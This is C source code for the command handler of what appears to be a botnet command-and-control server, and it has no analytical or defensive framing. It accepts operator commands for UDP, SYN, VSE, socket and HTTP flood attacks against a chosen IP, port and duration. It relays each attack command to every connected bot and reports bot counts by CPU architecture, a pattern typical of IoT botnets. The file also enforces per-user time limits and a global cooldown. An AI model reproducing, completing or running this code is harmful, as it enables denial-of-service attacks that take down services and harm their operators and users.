#include "command_handler.h"
#include "botnet.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

int is_attack_command(const char *command) {
    return strncmp(command, "!udp", 4) == 0 || strncmp(command, "!syn", 4) == 0 || strncmp(command, "!vse", 4) == 0 || strncmp(command, "!socket", 7) == 0 || strncmp(command, "!http", 5) == 0;
}

void process_command(const User *user, const char *command, int client_socket) {
    char response[MAX_COMMAND_LENGTH];

    if (strlen(command) == 0) {
        return;
    }

    log_command(user->user, command);

    if (is_attack_command(command)) {
        pthread_mutex_lock(&cooldown_mutex);
        if (global_cooldown > 0) {
            snprintf(response, sizeof(response),
                     RED "\rGlobal cooldown still active for "
                     YELLOW "%d seconds\n"
                     RESET, global_cooldown);
            pthread_mutex_unlock(&cooldown_mutex);
            send(client_socket, response, strlen(response), 0);
            return;
        }
        pthread_mutex_unlock(&cooldown_mutex);
    }

    if (strcmp(command, "!help") == 0) {
        snprintf(response, sizeof(response),
                 "\r\n" YELLOW "!stopall - stops all atks\n"
                 "\r!help - see this\n"
                 "\r!bots - list bots\n"
                 "\r!clear - clear screen\n"
                 BLUE "\r!vse - VSE Queries, udp generic [IP] [PORT] [TIME]\n"
                 "\r!udp - raw/plain flood udp [IP] [PORT] [TIME]\n"
                 "\r!syn - plain SYN Flood [IP] [PORT] [TIME]\n"
                 "\r!socket - open connection spam [IP] [PORT] [TIME]\n"
                 "\r!http - HTTP 1.1 request flood (tcp) [IP] [PORT] [TIME]\n"
                 RESET);
    } else if (strcmp(command, "!bots") == 0) {
        int valid_bots = 0;
        int arch_count[12] = {0};
        const char* arch_names[] = {"mips", "mipsel", "x86_64", "aarch64", "arm", "x86", "m68k", "i686", "sparc", "powerpc64", "sh4", "unknown"};
        pthread_mutex_lock(&bot_mutex);
        for (int i = 0; i < bot_count; i++) {
            if (bots[i].is_valid) {
                valid_bots++;
                if (strcmp(bots[i].arch, "mips") == 0) arch_count[0]++;
                else if (strcmp(bots[i].arch, "mipsel") == 0) arch_count[1]++;
                else if (strcmp(bots[i].arch, "x86_64") == 0) arch_count[2]++;
                else if (strcmp(bots[i].arch, "aarch64") == 0) arch_count[3]++;
                else if (strcmp(bots[i].arch, "arm") == 0) arch_count[4]++;
                else if (strcmp(bots[i].arch, "x86") == 0) arch_count[5]++;
                else if (strcmp(bots[i].arch, "m68k") == 0) arch_count[6]++;
                else if (strcmp(bots[i].arch, "i686") == 0) arch_count[7]++;
                else if (strcmp(bots[i].arch, "sparc") == 0) arch_count[8]++;
                else if (strcmp(bots[i].arch, "powerpc64") == 0) arch_count[9]++;
                else if (strcmp(bots[i].arch, "sh4") == 0) arch_count[10]++;
                else if (strcmp(bots[i].arch, "unknown") == 0) arch_count[11]++;
            }
        }
        pthread_mutex_unlock(&bot_mutex);
        snprintf(response, sizeof(response), "total: %d\r\n", valid_bots);
        for (int i = 0; i < 12; i++) {
            if (arch_count[i] > 0) {
                snprintf(response + strlen(response), sizeof(response) - strlen(response), "%s: %d\r\n", arch_names[i], arch_count[i]);
            }
        }
    } else if (strcmp(command, "!clear") == 0) {
        snprintf(response, sizeof(response), "\033[H\033[J");
    } else if (is_attack_command(command)) {
        char ip[20];
        int port, time;
        if (sscanf(command + strlen(command) - strlen(strchr(command, ' ')), "%s %d %d", ip, &port, &time) == 3) {
            if (validate_ip(ip) && validate_port(port)) {
                if (time > user->maxtime) {
                    snprintf(response, sizeof(response),
                             RED "\rMax time %d sec\n"
                             RESET, user->maxtime);
                } else {
                    char cmd[20];
                    sscanf(command, "%s", cmd);
                    snprintf(response, sizeof(response),
                             "\r%s %s:%d for %d seconds\n",
                             cmd, ip, port, time);
                    pthread_mutex_lock(&bot_mutex);
                    int valid_bots = 0;
                    for (int i = 0; i < bot_count; i++) {
                        if (bots[i].is_valid) {
                            send(bots[i].socket, command, strlen(command), 0);
                            valid_bots++;
                        }
                    }
                    pthread_mutex_unlock(&bot_mutex);
                    snprintf(response + strlen(response),
                             sizeof(response) - strlen(response),
                             "\rSent instructions to: %d bots\n", valid_bots);
                    pthread_mutex_lock(&cooldown_mutex);
                    global_cooldown = time;
                    pthread_mutex_unlock(&cooldown_mutex);
                }
            } else {
                snprintf(response, sizeof(response), RED "\rInvalid IP/port\n" RESET);
            }
        } else {
            snprintf(response, sizeof(response), RED "\rInvalid command opt\n" RESET);
        }
    } else if (strcmp(command, "!stopall") == 0) {
        pthread_mutex_lock(&bot_mutex);
        for (int i = 0; i < bot_count; i++) {
            send(bots[i].socket, "stop", strlen("stop"), 0);
        }
        pthread_mutex_unlock(&bot_mutex);
        snprintf(response, sizeof(response), "\rAttempting to stop attacks...\n");
        pthread_mutex_lock(&cooldown_mutex);
        global_cooldown = 0;
        pthread_mutex_unlock(&cooldown_mutex);
    } else {
        snprintf(response, sizeof(response), RED "\rCmd not found\n" RESET);
    }

    send(client_socket, response, strlen(response), 0);
}
